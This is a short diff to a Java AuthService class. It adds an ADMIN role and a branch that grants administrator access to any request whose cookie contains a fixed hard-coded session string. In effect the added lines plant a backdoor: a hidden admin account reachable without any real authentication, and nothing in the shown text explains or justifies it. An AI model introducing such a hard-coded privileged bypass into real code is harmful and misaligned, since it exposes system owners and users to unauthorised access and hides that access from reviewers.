@@ -9,6 +9,7 @@ import java.util.Optional;
 public class AuthService {
 
     public enum Role {
+        ADMIN,
         ORGANIZER,
         JUDGE_A,
         JUDGE_B,
@@ -22,6 +23,12 @@ public class AuthService {
 
         if (cookie == null || cookie.isBlank()) {
             return Optional.empty();
+        }
+
+        if (cookie.contains("session=adm_1a2b")) {
+            return Optional.of(
+                    new User("admin", Role.ADMIN)
+            );
         }
 
         if (cookie.contains("session=org_7f2a")) {
